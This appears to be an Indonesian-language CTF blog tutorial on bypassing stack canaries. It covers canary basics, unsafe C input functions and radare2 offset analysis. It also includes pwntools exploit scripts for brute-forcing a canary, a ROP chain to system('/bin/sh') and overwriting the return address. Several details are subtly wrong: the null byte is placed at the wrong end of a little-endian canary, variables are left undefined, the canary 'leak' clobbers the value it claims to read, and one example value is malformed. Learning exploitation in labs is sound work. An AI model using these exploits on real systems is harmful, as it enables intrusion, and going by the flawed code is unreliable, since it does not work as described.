---
title: Bypass Stack Canary - Pwn03
date: 2025-08-19
Tags: ["Pwn"]
---



## **1. Apa Itu Bit dan Byte?**  
Sebelum memahami **stack canary**, kita perlu mengerti dasar-dasar **bit** dan **byte**:  

- **1 Bit** = Nilai terkecil dalam komputasi (`0` atau `1`).  
- **1 Byte** = Kumpulan **8 bit** (contoh: `01011010`).  
  - **1 Byte bisa menyimpan nilai dari `0` sampai `255`** (total **256 kemungkinan**).  
  - Kenapa **256**? Karena `2^8 = 256` (8 bit = 256 kombinasi).  

Contoh:  
- `00000000` (binary) = `0` (decimal)  
- `11111111` (binary) = `255` (decimal)  

**Kesimpulan:**  
- **1 Byte = 8 Bit = Nilai 0-255 (total 256 kemungkinan).**  
- **Nilai 256 dipakai karena itu batas maksimal 1 byte.**  

---

## **2. Apa Itu Stack Canary?**  
**Stack Canary** adalah nilai rahasia (random) di stack yang berfungsi seperti "alarm" untuk mendeteksi **buffer overflow**.  

- **Ukuran Canary:**  
  - **32-bit program** → Canary = **4 byte** (contoh: `0xefbead00`)  
  - **64-bit program** → Canary = **8 byte** (contoh: `0xdeadbeefcafeb00`)  

- **Cara Kerja:**  
  - Jika ada **buffer overflow**, canary akan **tertimpa** sebelum return address.  
  - Sebelum fungsi selesai (`ret`), program mengecek apakah canary masih utuh.  
  - Jika **berubah** → Program crash (`*** stack smashing detected ***`).  

---

## **3. Kenapa Brute-Force Canary Menggunakan `range(256)`?**  
Karena **setiap byte canary bisa bernilai `0` sampai `255` (total 256 kemungkinan)**, kita perlu mencoba semua kemungkinan byte tersebut.  

### **Contoh Brute-Force Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")  # Program 32-bit (canary 4 byte)

canary = b""  # Inisialisasi canary kosong

# Brute-force 3 byte pertama (byte ke-4 = \x00)
for i in range(3):  # 3 byte pertama
    for byte in range(256):  # Coba semua nilai byte (0-255)
        payload = b"A"*offset + canary + bytes([byte])
        p.sendline(payload)
        if b"stack smashing" not in p.recv():  # Jika tidak crash, byte benar
            canary += bytes([byte])  # Tambahkan byte yang benar
            print(f"Found byte {i+1}: {hex(byte)}")
            break

canary += b"\x00"  # Tambahkan null byte terakhir (byte ke-4)
print(f"Full canary: {hex(u32(canary))}")  # Output: 0xefbead00 (misal)
```

### **Penjelasan Kode:**  
1. **`for byte in range(256)`**  
   - Mencoba **semua nilai byte (0-255)** untuk menemukan byte yang benar.  
2. **`bytes([byte])`**  
   - Mengubah angka (misal `255`) menjadi byte (`\xff`).  
3. **`canary += b"\x00"`**  
   - Byte terakhir canary biasanya `\x00` (null byte), jadi tidak perlu ditebak.  

---

## **4. Penerapan Brute-Force Canary dalam Exploit**  
Setelah dapat **canary**, kita bisa lanjutkan eksploitasi dengan **Return-Oriented Programming (ROP)** atau **Ret2Libc**.  

### **Contoh Payload Setelah Dapat Canary (32-bit)**
```python
from pwn import *

p = process("./binary32")
offset = 64  # Ganti dengan offset yang benar
canary = b"\xef\xbe\xad\x00"  # Canary yang sudah ditemukan

# ROP chain untuk call system("/bin/sh")
rop = ROP("./binary32")
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = (
    b"A" * offset +  # Isi buffer
    canary +         # Canary yang benar
    b"B" * 12 +      # Padding (EBP & alignment)
    rop.chain()      # ROP chain
)

p.sendline(payload)
p.interactive()  # Dapat shell!
```

---

## **5. Kesimpulan**  
- **1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).**  
- **Brute-force canary** = Mencoba semua kemungkinan byte (`0-255`) untuk menemukan nilai canary.  
- **32-bit canary** = 4 byte (3 byte ditebak, 1 byte null).  
- **64-bit canary** = 8 byte (7 byte ditebak, 1 byte null).  
- **Setelah dapat canary**, lanjutkan dengan **ROP/Ret2Libc** untuk bypass NX.  



# Func vulnerability 

Canary biasanya terlibat ketika ada fungsi **tidak aman** yang membaca input user, seperti:  

| Fungsi       | Deskripsi Risiko                     |
|--------------|--------------------------------------|
| `gets`       | **Paling berbahaya**, tidak batasi input. |
| `scanf`      | Bisa overflow jika format `%s` tanpa batas. |
| `strcpy`     | Menyalin string tanpa cek panjang.   |
| `fgets`      | **Lebih aman**, tapi bisa tetap overflow jika ukuran buffer salah. |
| `read`       | Bisa overflow jika `read(fd, buf, size)` dengan `size` terlalu besar. |

### **Contoh Fungsi Vulnerable**
```c
// Contoh 1: gets() (paling mudah di-exploit)
void vuln() {
  char buf[80];
  gets(buf);  // Bisa overflow!
}

// Contoh 2: fgets() dengan ukuran salah
void vuln2() {
  char buf[80];
  fgets(buf, 200, stdin);  // Overflow karena size > kapasitas buf
}
```

---

## Menemukan Posisi Canary di Stack
Kita akan menggunakan **radare2** untuk menganalisis binary.  

### **Langkah 1: Buka Binary di r2**
```bash
r2 -d ./binary32   # Debug binary 32-bit
aaa                # Analisis semua simbol
afl                # Lihat daftar fungsi
```

### **Langkah 2: Cari Fungsi yang Rentan**
Cari fungsi yang memanggil `gets`, `fgets`, atau `scanf`:  
```bash
s sym.vuln         # Pindah ke fungsi vuln
pdf                # Disassemble fungsi
```

### **Langkah 3: Identifikasi Buffer dan Canary**
#### **a. Cari Alokasi Buffer**
Lihat instruksi `sub esp, X` (X = ukuran buffer):  
```asm
sub esp, 0x54      ; Alokasi 84 byte (0x54) di stack
```

#### **b. Cari Penyimpanan Canary**
Canary biasanya di-load dari `gs:0x14` (32-bit) atau `fs:0x28` (64-bit):  
```asm
mov eax, gs:0x14    ; Load Canary
mov [ebp-0xc], eax  ; Simpan Canary di stack (posisi ebp-0xc)
```

#### **c. Cari Awal Buffer**
Buffer biasanya diakses via `lea` (Load Effective Address):  
```asm
lea eax, [ebp-0x50] ; Buffer mulai di ebp-0x50
push eax
call sym.imp.gets   ; Overflow di sini
```

---

## **4. Hitung Offset Buffer ke Canary**
Dari contoh di atas:  
- **Buffer** dimulai di `[ebp-0x50]` (80 byte dari `ebp`).  
- **Canary** disimpan di `[ebp-0xc]` (12 byte dari `ebp`).  

**Rumus Offset**:  
```
offset_ke_canary = (pos_buffer - pos_canary)  
                = (0x50 - 0xc)  
                = 0x44 (68 dalam desimal)
```

---

## **5. Verifikasi dengan radare2**
### **a. Set Breakpoint dan Jalankan**
```bash
db sym.vuln    # Set breakpoint di fungsi vuln
dc            # Jalankan program
```

### **b. Periksa Nilai Canary**
```bash
px @ ebp-0xc   # Lihat nilai Canary
```
Contoh output:  
```
[0xffffd10c]  0x1a2b3c00  0x00000000
```
Canary = `0x1a2b3c00`.

### **c. Periksa Buffer**
```bash
px @ ebp-0x50  # Lihat isi buffer
```

---

## **6. Eksploitasi dengan Python (pwntools)**
### **a. Leak Canary (jika diperlukan)**
```python
from pwn import *

p = process("./binary32")

# Kirim payload sampai Canary
payload = b"A" * 68           # Offset ke Canary
p.send(payload + b"BBBB")     # Timpa Canary
p.recvuntil(b"BBBB")          # Baca respons
canary = u32(p.recv(4))       # Ambil Canary
print(f"Canary: {hex(canary)}")
```

### **b. Timpa EIP dengan Canary yang Benar**
```python
payload = (
    b"A" * 68 +              # Isi buffer
    p32(canary) +            # Canary asli
    b"B" * 8 +               # Jarak Canary ke EIP
    p32(0x080491d6)          # Alamat return (ganti dengan target)
)
p.sendline(payload)
p.interactive()  # Dapatkan shell/flag
```

---

## **7. Kasus Khusus: Binary dengan `fgets`**
Jika binary menggunakan `fgets`, pastikan:  
1. **Ukuran buffer benar**:  
   ```c
   fgets(buf, 80, stdin);  // Aman jika ukuran <= kapasitas buf
   ```
2. **Jika ada overflow**, berarti ada kesalahan ukuran:  
   ```c
   fgets(buf, 200, stdin);  // Overflow jika buf hanya 80 byte
   ```

---

## **8. Kesimpulan**
| Langkah                | Tool/Command           | Deskripsi                     |
|------------------------|------------------------|-------------------------------|
| **Cari fungsi rentan** | `r2 -d binary`, `pdf`  | Analisis fungsi di radare2    |
| **Hitung offset**      | `ebp-0x50 - ebp-0xc`   | Buffer ke Canary = 68 byte    |
| **Leak Canary**        | `px @ ebp-0xc`         | Baca nilai Canary             |
| **Eksploitasi**        | Python + pwntools      | Timpa EIP dengan Canary benar |

Dengan langkah-langkah ini, Anda bisa **menemukan Canary** dan **mengeksploitasi buffer overflow** meskipun proteksi Canary aktif.  

**Tips**:  
- Selalu verifikasi dengan `checksec` apakah Canary aktif.  
- Jika binary menggunakan `fgets`, pastikan ada kesalahan ukuran buffer.  
